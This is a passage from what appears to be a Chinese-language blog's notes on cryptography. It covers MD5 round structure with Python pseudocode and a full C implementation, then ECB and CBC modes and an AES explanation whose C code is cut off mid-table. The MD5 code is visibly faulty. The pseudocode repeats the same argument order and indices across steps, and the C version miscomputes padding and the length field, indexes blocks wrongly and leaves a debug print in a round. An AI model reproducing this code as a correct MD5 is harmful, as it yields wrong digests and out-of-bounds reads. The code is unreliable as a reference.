<li>对于每一个分组，将上一次计算的A,B,C,D复制到a,b,c,d中，进行下面的4轮计算，然后将a,b,c,d分别加到A,B,C,D上，下一组继续运行此算法，最终输出就是A||B||C||D，||在这里代表拼接</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一轮</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">    FF(a,b,c,d,M[pos[<span class="number">0</span>][i]],s[<span class="number">0</span>][<span class="number">0</span>],t[<span class="number">0</span>][i])</span><br><span class="line">    FF(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">1</span>]],s[<span class="number">0</span>][<span class="number">1</span>],t[<span class="number">0</span>][i+<span class="number">1</span>])</span><br><span class="line">    FF(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">2</span>]],s[<span class="number">0</span>][<span class="number">2</span>],t[<span class="number">0</span>][i+<span class="number">2</span>])</span><br><span class="line">    FF(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">3</span>]],s[<span class="number">0</span>][<span class="number">3</span>],t[<span class="number">0</span>][i+<span class="number">3</span>])</span><br><span class="line"><span class="comment"># 第二轮</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">    GG(a,b,c,d,M[pos[<span class="number">0</span>][i]],s[<span class="number">0</span>][<span class="number">0</span>],t[<span class="number">0</span>][i])</span><br><span class="line">    GG(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">1</span>]],s[<span class="number">0</span>][<span class="number">1</span>],t[<span class="number">0</span>][i+<span class="number">1</span>])</span><br><span class="line">    GG(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">2</span>]],s[<span class="number">0</span>][<span class="number">2</span>],t[<span class="number">0</span>][i+<span class="number">2</span>])</span><br><span class="line">    GG(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">3</span>]],s[<span class="number">0</span>][<span class="number">3</span>],t[<span class="number">0</span>][i+<span class="number">3</span>])</span><br><span class="line"><span class="comment"># 第三轮</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">    HH(a,b,c,d,M[pos[<span class="number">0</span>][i]],s[<span class="number">0</span>][<span class="number">0</span>],t[<span class="number">0</span>][i])</span><br><span class="line">    HH(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">1</span>]],s[<span class="number">0</span>][<span class="number">1</span>],t[<span class="number">0</span>][i+<span class="number">1</span>])</span><br><span class="line">    HH(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">2</span>]],s[<span class="number">0</span>][<span class="number">2</span>],t[<span class="number">0</span>][i+<span class="number">2</span>])</span><br><span class="line">    HH(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">3</span>]],s[<span class="number">0</span>][<span class="number">3</span>],t[<span class="number">0</span>][i+<span class="number">3</span>])</span><br><span class="line"><span class="comment"># 第四轮</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">    II(a,b,c,d,M[pos[<span class="number">0</span>][i]],s[<span class="number">0</span>][<span class="number">0</span>],t[<span class="number">0</span>][i])</span><br><span class="line">    II(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">1</span>]],s[<span class="number">0</span>][<span class="number">1</span>],t[<span class="number">0</span>][i+<span class="number">1</span>])</span><br><span class="line">    II(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">2</span>]],s[<span class="number">0</span>][<span class="number">2</span>],t[<span class="number">0</span>][i+<span class="number">2</span>])</span><br><span class="line">    II(d,a,b,c,M[pos[<span class="number">0</span>][i+<span class="number">3</span>]],s[<span class="number">0</span>][<span class="number">3</span>],t[<span class="number">0</span>][i+<span class="number">3</span>])</span><br></pre></td></tr></table></figure>

<p>其中pos和t，s数组会在代码中体现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x,y,z) (((x)&amp;(y))|(~(x)&amp;(z)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x,y,z) (((x)&amp;(z))|((y)&amp;~(z)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H(x,y,z) ((x)^(y)^(z))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I(x,y,z) ((y)^((x)|~(z)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) (((x)<span class="meta-string">&lt;&lt;(i))|((x)&gt;&gt;(32-(i))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FF(a,b,c,d,M_j,s,t_i) ((b)+ROL32((a)+(F(b,c,d)+(M_j)+(t_i)),s))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GG(a,b,c,d,M_j,s,t_i) ((b)+ROL32((a)+(G(b,c,d)+(M_j)+(t_i)),s))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HH(a,b,c,d,M_j,s,t_i) ((b)+ROL32((a)+(H(b,c,d)+(M_j)+(t_i)),s))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> II(a,b,c,d,M_j,s,t_i) ((b)+ROL32((a)+(I(b,c,d)+(M_j)+(t_i)),s))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> s[] = &#123;</span><br><span class="line">    <span class="number">7</span>,<span class="number">12</span>,<span class="number">17</span>,<span class="number">22</span>,</span><br><span class="line">    <span class="number">5</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">20</span>,</span><br><span class="line">    <span class="number">4</span>,<span class="number">11</span>,<span class="number">16</span>,<span class="number">23</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">21</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> t[] = &#123;</span><br><span class="line">    <span class="number">0xd76aa478</span>,<span class="number">0xe8c7b756</span>,<span class="number">0x242070db</span>,<span class="number">0xc1bdceee</span>,</span><br><span class="line">    <span class="number">0xf57c0faf</span>,<span class="number">0x4787c62a</span>,<span class="number">0xa8304613</span>,<span class="number">0xfd469501</span>,</span><br><span class="line">    <span class="number">0x698098d8</span>,<span class="number">0x8b44f7af</span>,<span class="number">0xffff5bb1</span>,<span class="number">0x895cd7be</span>,</span><br><span class="line">    <span class="number">0x6b901122</span>,<span class="number">0xfd987193</span>,<span class="number">0xa679438e</span>,<span class="number">0x49b40821</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xf61e2562</span>,<span class="number">0xc040b340</span>,<span class="number">0x265e5a51</span>,<span class="number">0xe9b6c7aa</span>,</span><br><span class="line">    <span class="number">0xd62f105d</span>,<span class="number">0x02441453</span>,<span class="number">0xd8a1e681</span>,<span class="number">0xe7d3fbc8</span>,</span><br><span class="line">    <span class="number">0x21e1cde6</span>,<span class="number">0xc33707d6</span>,<span class="number">0xf4d50d87</span>,<span class="number">0x455a14ed</span>,</span><br><span class="line">    <span class="number">0xa9e3e905</span>,<span class="number">0xfcefa3f8</span>,<span class="number">0x676f02d9</span>,<span class="number">0x8d2a4c8a</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xfffa3942</span>,<span class="number">0x8771f681</span>,<span class="number">0x6d9d6122</span>,<span class="number">0xfde5380c</span>,</span><br><span class="line">    <span class="number">0xa4beea44</span>,<span class="number">0x4bdecfa9</span>,<span class="number">0xf6bb4b60</span>,<span class="number">0xbebfbc70</span>,</span><br><span class="line">    <span class="number">0x289b7ec6</span>,<span class="number">0xeaa127fa</span>,<span class="number">0xd4ef3085</span>,<span class="number">0x04881d05</span>,</span><br><span class="line">    <span class="number">0xd9d4d039</span>,<span class="number">0xe6db99e5</span>,<span class="number">0x1fa27cf8</span>,<span class="number">0xc4ac5665</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xf4292244</span>,<span class="number">0x432aff97</span>,<span class="number">0xab9423a7</span>,<span class="number">0xfc93a039</span>,</span><br><span class="line">    <span class="number">0x655b59c3</span>,<span class="number">0x8f0ccc92</span>,<span class="number">0xffeff47d</span>,<span class="number">0x85845dd1</span>,</span><br><span class="line">    <span class="number">0x6fa87e4f</span>,<span class="number">0xfe2ce6e0</span>,<span class="number">0xa3014314</span>,<span class="number">0x4e0811a1</span>,</span><br><span class="line">    <span class="number">0xf7537e82</span>,<span class="number">0xbd3af235</span>,<span class="number">0x2ad7d2bb</span>,<span class="number">0xeb86d391</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;===========%s==============\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x,&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">md5</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">size_t</span> len,<span class="keyword">uint32_t</span> res[<span class="number">4</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> iv[<span class="number">4</span>] = &#123;<span class="number">0x67452301</span>,<span class="number">0xefcdab89</span>,<span class="number">0x98badcfe</span>,<span class="number">0x10325476</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> a,b,c,d;</span><br><span class="line">    <span class="keyword">size_t</span> pos;</span><br><span class="line">    <span class="comment">// 消息填充</span></span><br><span class="line">    <span class="keyword">size_t</span> plen = ((len+<span class="number">1</span>+<span class="number">63</span>)&gt;&gt;<span class="number">5</span>)&lt;&lt;<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> *pdata = alloca(plen);</span><br><span class="line">    <span class="built_in">memcpy</span>(pdata,data,len);</span><br><span class="line">    pdata[len]=<span class="number">0x80</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;pdata[len+<span class="number">1</span>],<span class="number">0</span>,plen-len<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;pdata[plen<span class="number">-8</span>],&amp;plen,<span class="number">8</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;%lld\n&quot;,plen);</span></span><br><span class="line">    <span class="comment">// printArray(&quot;my&quot;,pdata,plen);</span></span><br><span class="line">    <span class="comment">// 进行计算</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;plen;i+=<span class="number">64</span>)&#123;</span><br><span class="line">        a = iv[<span class="number">0</span>];</span><br><span class="line">        b = iv[<span class="number">1</span>];</span><br><span class="line">        c = iv[<span class="number">2</span>];</span><br><span class="line">        d = iv[<span class="number">3</span>];</span><br><span class="line">        <span class="comment">// printf(&quot;iv[%d]: %08x %08x %08x %08x\n&quot;,i/64,a,b,c,d);</span></span><br><span class="line">        <span class="comment">// 第一轮</span></span><br><span class="line">        pos=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j+=<span class="number">4</span>)&#123;</span><br><span class="line">            a = FF(a,b,c,d,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">0</span>],t[j]);</span><br><span class="line">            <span class="comment">// printf(&quot;%08x %08x %08x %08x\n&quot;,a,b,c,d);</span></span><br><span class="line">            pos+=<span class="number">1</span>;</span><br><span class="line">            d = FF(d,a,b,c,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">1</span>],t[j+<span class="number">1</span>]);</span><br><span class="line">            pos+=<span class="number">1</span>;</span><br><span class="line">            c = FF(c,d,a,b,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">2</span>],t[j+<span class="number">2</span>]);</span><br><span class="line">            pos+=<span class="number">1</span>;</span><br><span class="line">            b = FF(b,c,d,a,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">3</span>],t[j+<span class="number">3</span>]);</span><br><span class="line">            pos+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第二轮</span></span><br><span class="line">        pos=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j+=<span class="number">4</span>)&#123;</span><br><span class="line">            a = GG(a,b,c,d,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">4</span>],t[<span class="number">16</span>+j]);</span><br><span class="line">            pos=(pos+<span class="number">5</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            d = GG(d,a,b,c,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">5</span>],t[<span class="number">16</span>+j+<span class="number">1</span>]);</span><br><span class="line">            pos=(pos+<span class="number">5</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            c = GG(c,d,a,b,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">6</span>],t[<span class="number">16</span>+j+<span class="number">2</span>]);</span><br><span class="line">            pos=(pos+<span class="number">5</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            b = GG(b,c,d,a,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">7</span>],t[<span class="number">16</span>+j+<span class="number">3</span>]);</span><br><span class="line">            pos=(pos+<span class="number">5</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第三轮</span></span><br><span class="line">        pos=<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j+=<span class="number">4</span>)&#123;</span><br><span class="line">            a = HH(a,b,c,d,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">8</span>],t[<span class="number">32</span>+j]);</span><br><span class="line">            pos=(pos+<span class="number">3</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            d = HH(d,a,b,c,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">9</span>],t[<span class="number">32</span>+j+<span class="number">1</span>]);</span><br><span class="line">            pos=(pos+<span class="number">3</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            c = HH(c,d,a,b,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">10</span>],t[<span class="number">32</span>+j+<span class="number">2</span>]);</span><br><span class="line">            pos=(pos+<span class="number">3</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            b = HH(b,c,d,a,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">11</span>],t[<span class="number">32</span>+j+<span class="number">3</span>]);</span><br><span class="line">            pos=(pos+<span class="number">3</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%08x %08x %08x %08x\n&quot;</span>,a,b,c,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第四轮</span></span><br><span class="line">        pos=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j+=<span class="number">4</span>)&#123;</span><br><span class="line">            a = II(a,b,c,d,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">12</span>],t[<span class="number">48</span>+j]);</span><br><span class="line">            pos=(pos+<span class="number">7</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            d = II(d,a,b,c,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">13</span>],t[<span class="number">48</span>+j+<span class="number">1</span>]);</span><br><span class="line">            pos=(pos+<span class="number">7</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            c = II(c,d,a,b,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">14</span>],t[<span class="number">48</span>+j+<span class="number">2</span>]);</span><br><span class="line">            pos=(pos+<span class="number">7</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">            b = II(b,c,d,a,*(<span class="keyword">uint32_t</span>*)&amp;pdata[pos*<span class="number">4</span>+i*<span class="number">64</span>],s[<span class="number">15</span>],t[<span class="number">48</span>+j+<span class="number">3</span>]);</span><br><span class="line">            pos=(pos+<span class="number">7</span>)&amp;<span class="number">0xf</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iv[<span class="number">0</span>]+=a;</span><br><span class="line">        iv[<span class="number">1</span>]+=b;</span><br><span class="line">        iv[<span class="number">2</span>]+=c;</span><br><span class="line">        iv[<span class="number">3</span>]+=d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(res,iv,<span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)*<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> res[<span class="number">4</span>];</span><br><span class="line">    md5(<span class="string">&quot;deadbeef&quot;</span>,<span class="number">8</span>,res);</span><br><span class="line">    printArray(<span class="string">&quot;mymd5&quot;</span>,(<span class="keyword">uint8_t</span>*)res,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>《应用密码学：协议、算法与C源程序》</p>
<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><h3 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h3><p>设$c_i,p_i,iv,f$分别为第$i$个密文块，明文块，初始向量，加密函数。ECB模式无$iv$。</p>
<h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><p>每个块自行加密</p>
<p>$c_0=f(p_0),c_1=f(p_1),…,c_n=f(p_n)$</p>
<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><p>当前块加密会影响到以后的块</p>
<p>$c_0=f(iv\oplus p_0),c_1=f(p_1\oplus c_0),…,c_n=f(c_{n-1}\oplus p_n)$</p>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>参考自<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/aes-zh/">https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/aes-zh/</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253884.htm#msg_header_h1_0">https://bbs.pediy.com/thread-253884.htm#msg_header_h1_0</a></p>
<p>也叫Rijndael 128加密法。加密过程中，每一块都是128比特。</p>
<p>使用代换-置换网络</p>
<p>加密的单位为4*4字节共4步</p>
<ol>
<li><p>AddRountKey</p>
<p>每一回合与该次密钥做xor运算，密钥通过Rijndael密钥生成方案产生</p>
</li>
<li><p>SubBytes</p>
<p>把每一个字节通过查找表(s盒)的方式替换成另一个</p>
</li>
<li><p>ShiftRows</p>
<p>可以理解为每个双字单位分散到其它双字</p>
<p>这里是不同双字的混合</p>
</li>
<li><p>MixColumns</p>
<p>使用线性变换在一个双字内部混合</p>
<p>这里是一个双字内部的混合</p>
<p>实现中表现为一个矩阵乘</p>
</li>
</ol>
<ul>
<li><p>第一轮加密之前需要进行“白化操作”，即首先异或密钥</p>
</li>
<li><p>最后一轮没有MixColumns操作，使用AddRountKey替代</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOCK_SIZE 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) (((x)<span class="meta-string">&lt;&lt;i)|((x)&gt;&gt;(32-i)))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s2b(i,j) (((i))+((j)&lt;&lt;2)) <span class="comment">// 将state坐标转化为block坐标</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> k[<span class="number">44</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> RC[] = &#123;<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> SBOX[]= &#123;<span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0xF2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0xC5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0xFE</span>,<span class="number">0xD7</span>,<span class="number">0xAB</span>,<span class="number">0x76</span>,<span class="number">0xCA</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7D</span>,<span 